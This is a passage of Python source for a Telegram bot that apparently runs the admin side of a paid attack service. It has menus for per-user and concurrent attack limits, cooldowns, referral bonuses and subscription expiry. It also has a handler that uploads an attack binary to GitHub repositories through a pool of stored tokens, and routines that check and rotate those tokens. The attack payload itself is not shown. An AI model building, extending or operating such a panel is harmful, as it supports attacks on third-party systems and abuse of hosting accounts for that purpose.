        [InlineKeyboardButton("10", callback_data="maxattacks_10"),
         InlineKeyboardButton("25", callback_data="maxattacks_25"),
         InlineKeyboardButton("50", callback_data="maxattacks_50")],
        [InlineKeyboardButton("100", callback_data="maxattacks_100"),
         InlineKeyboardButton("Unlimited", callback_data="maxattacks_999999")],
        [InlineKeyboardButton("Custom", callback_data="maxattacks_custom"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('max_attacks', '40')
    await update.message.reply_text(
        f"🎯 **SET MAX ATTACKS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}\n\n"
        f"Select new maximum attacks per user:",
        reply_markup=reply_markup
    )
async def set_max_concurrent_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("1", callback_data="concurrent_1"),
         InlineKeyboardButton("2", callback_data="concurrent_2"),
         InlineKeyboardButton("3", callback_data="concurrent_3")],
        [InlineKeyboardButton("5", callback_data="concurrent_5"),
         InlineKeyboardButton("10", callback_data="concurrent_10")],
        [InlineKeyboardButton("Custom", callback_data="concurrent_custom"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('max_concurrent_attacks', '3')
    await update.message.reply_text(
        f"🚀 **SET MAX CONCURRENT ATTACKS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}\n\n"
        f"Select new maximum concurrent attacks:",
        reply_markup=reply_markup
    )
async def set_auto_ban_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("3", callback_data="autoban_3"),
         InlineKeyboardButton("5", callback_data="autoban_5"),
         InlineKeyboardButton("10", callback_data="autoban_10")],
        [InlineKeyboardButton("Disabled", callback_data="autoban_999999")],
        [InlineKeyboardButton("Custom", callback_data="autoban_custom"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('auto_ban_threshold', '5')
    await update.message.reply_text(
        f"🚫 **SET AUTO-BAN THRESHOLD**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}\n\n"
        f"Select failed attacks before auto-ban:",
        reply_markup=reply_markup
    )
async def set_welcome_message_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    temp_data[user_id] = {"step": "set_welcome_message"}
    reply_markup = get_cancel_keyboard()
    current = get_setting('welcome_message', 'Welcome to the Bot! 🚀')
    await update.message.reply_text(
        f"💬 **SET WELCOME MESSAGE**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}\n\n"
        f"Send new welcome message:",
        reply_markup=reply_markup
    )
async def set_rate_limit_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("2s", callback_data="ratelimit_2"),
         InlineKeyboardButton("5s", callback_data="ratelimit_5"),
         InlineKeyboardButton("10s", callback_data="ratelimit_10")],
        [InlineKeyboardButton("30s", callback_data="ratelimit_30"),
         InlineKeyboardButton("60s", callback_data="ratelimit_60")],
        [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('rate_limit_seconds', '5')
    await update.message.reply_text(
        f"⏰ **SET RATE LIMIT**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current}s\n\n"
        f"Select new rate limit:",
        reply_markup=reply_markup
    )
async def set_referral_bonus_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    keyboard = [
        [InlineKeyboardButton("1 Day", callback_data="refbonus_1"),
         InlineKeyboardButton("3 Days", callback_data="refbonus_3"),
         InlineKeyboardButton("7 Days", callback_data="refbonus_7")],
        [InlineKeyboardButton("15 Days", callback_data="refbonus_15"),
         InlineKeyboardButton("30 Days", callback_data="refbonus_30")],
        [InlineKeyboardButton("Custom", callback_data="refbonus_custom"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    current = get_setting('referral_bonus_days', '3')
    await update.message.reply_text(
        f"🎁 **SET REFERRAL BONUS**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: {current} days\n\n"
        f"Select bonus days for each referral:",
        reply_markup=reply_markup
    )
async def show_cleanup_settings(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    message = (
        "🧹 **CLEANUP SETTINGS**\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        "📋 **Automatic Cleanup:**\n"
        "• Attack logs: 30 days\n"
        "• Activity logs: 30 days\n"
        "• Expired users: Daily check\n\n"
        "⏰ **Schedule:**\n"
        "• Old data cleanup: Daily 00:00\n"
        "• Expired users: Daily 01:00\n"
        "• Scheduled attacks: Every 5 minutes\n"
        "• Renewal reminders: Daily 12:00\n\n"
        "✅ All cleanup tasks are running automatically."
    )
    await update.message.reply_text(message)
async def remove_token_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    tokens = get_all_tokens()
    if not tokens:
        await update.message.reply_text("📭 **NO TOKENS TO REMOVE**")
        return
    temp_data[user_id] = {"step": "remove_token_id"}
    reply_markup = get_cancel_keyboard()
    message = "🗑️ **REMOVE TOKEN**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, token in enumerate(tokens, 1):
        username = token[2]
        repo = token[3]
        message += f"{i}. {username} ({repo})\n"
    message += f"\nSend token number (1-{len(tokens)}):"
    await update.message.reply_text(message, reply_markup=reply_markup)
async def auto_rotate_tokens_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    await update.message.reply_text("🔄 **CHECKING AND ROTATING TOKENS...**")
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT id, token, username FROM tokens WHERE status = "active"')
    tokens = cursor.fetchall()
    rotated = 0
    failed = 0
    for token_id, token_str, username in tokens:
        try:
            g = Github(token_str)
            user = g.get_user()
            _ = user.login
            update_token_health(token_id, 100)
        except:
            cursor.execute('UPDATE tokens SET status = "inactive", health_score = 0 WHERE id = ?', (token_id,))
            rotated += 1
    conn.commit()
    conn.close()
    await update.message.reply_text(
        f"✅ **AUTO-ROTATE COMPLETED**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Rotated (deactivated): {rotated}\n"
        f"✅ Healthy: {len(tokens) - rotated}"
    )
    log_activity(user_id, "auto_rotate_tokens", f"Rotated {rotated} expired tokens")
async def set_token_priority_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    tokens = get_all_tokens()
    if not tokens:
        await update.message.reply_text("📭 **NO TOKENS FOUND**")
        return
    temp_data[user_id] = {"step": "set_priority_token_id"}
    reply_markup = get_cancel_keyboard()
    message = "⭐ **SET TOKEN PRIORITY - STEP 1/2**\n━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, token in enumerate(tokens, 1):
        username = token[2]
        priority = token[9]
        message += f"{i}. {username} (Priority: {priority})\n"
    message += f"\nSend token number (1-{len(tokens)}):"
    await update.message.reply_text(message, reply_markup=reply_markup)
async def remove_expired_tokens_handler(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return
    await update.message.reply_text("🧹 **REMOVING EXPIRED TOKENS...**")
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute('SELECT id, token, username FROM tokens WHERE status = "active"')
    tokens = cursor.fetchall()
    removed = 0
    for token_id, token_str, username in tokens:
        try:
            g = Github(token_str)
            user = g.get_user()
            _ = user.login
        except:
            cursor.execute('DELETE FROM tokens WHERE id = ?', (token_id,))
            removed += 1
    conn.commit()
    conn.close()
    await update.message.reply_text(
        f"✅ **CLEANUP COMPLETED**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🗑️ Removed: {removed}\n"
        f"✅ Remaining: {len(tokens) - removed}"
    )
    log_activity(user_id, "remove_expired_tokens", f"Removed {removed} expired tokens")
async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in temp_data:
        return
    step = temp_data[user_id].get("step")
    if step == "binary_upload":
        await update.message.reply_text("📥 **DOWNLOADING BINARY...**")
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)
            with open(file_path, 'rb') as f:
                binary_content = f.read()
            save_binary_file(binary_content)
            tokens = get_all_tokens()
            success = 0
            for token in tokens:
                token_str = token[1]
                repo = token[3]
                result, msg = upload_binary_to_repo(token_str, repo, binary_content)
                if result:
                    success += 1
            os.remove(file_path)
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **BINARY UPLOADED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Successful: {success}\n"
                f"📊 Total: {len(tokens)}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "upload_binary", f"Uploaded binary to {success} repos")
        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
    elif step == "import_users":
        await update.message.reply_text("📥 **IMPORTING USERS...**")
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_import_{user_id}.csv"
            await file.download_to_drive(file_path)
            imported, skipped = import_users_csv(file_path)
            os.remove(file_path)
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **IMPORT COMPLETED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Imported: {imported}\n"
                f"⏭️ Skipped: {skipped}",
                reply_markup=reply_markup
            )
            log_activity(user_id, "import_users", f"Imported {imported} users")
        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
    elif step == "restore_database":
        await update.message.reply_text("♻️ **RESTORING DATABASE...**")
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_restore_{user_id}.db"
            await file.download_to_drive(file_path)
            restore_database(file_path)
            os.remove(file_path)
            del temp_data[user_id]
            reply_markup = get_main_keyboard(user_id)
            await update.message.reply_text(
                f"✅ **DATABASE RESTORED**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"Database has been restored from backup.",
                reply_markup=reply_markup
            )
            log_activity(user_id, "restore_database", "Restored database from backup")
        except Exception as e:
            await update.message.reply_text(f"❌ **ERROR**\n{str(e)}")
def main():
    init_database()
    scheduler_thread = threading.Thread(target=run_scheduled_tasks, daemon=True)
    scheduler_thread.start()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))
    print("🤖 **BOT IS RUNNING...**")
    print("━━━━━━━━━━━━━━━━━━━━")
    print(f"📊 Database: {DB_PATH}")
    print(f"🔧 Maintenance: {get_setting('maintenance_mode', '0')}")
    print(f"⏱️ Cooldown: {get_setting('cooldown_duration', '40')}s")
    print(f"🎯 Max Attacks: {get_setting('max_attacks', '40')}")
    print(f"🚀 Max Concurrent: {get_setting('max_concurrent_attacks', '3')}")
    print("━━━━━━━━━━━━━━━━━━━━")
    application.run_polling()
if __name__ == '__main__':
    main()
